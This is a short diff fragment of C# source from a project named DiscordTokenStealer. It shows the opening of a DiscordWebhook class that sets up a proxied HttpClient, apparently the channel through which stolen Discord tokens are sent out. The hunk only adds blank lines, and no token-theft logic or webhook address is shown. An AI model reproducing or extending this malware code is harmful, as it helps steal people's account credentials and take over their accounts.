@@ -2,9 +2,11 @@
 using System.Net.Http.Json;
 
 namespace DiscordTokenStealer.Discord;
+
 public class DiscordWebhook : IDisposable
 {
     private readonly HttpClient _client;
+
     private DiscordWebhook(Uri webhookUri)
     {
         _client = new HttpClient(new HttpClientHandler { UseProxy = true, Proxy = new WebProxy() }, true)
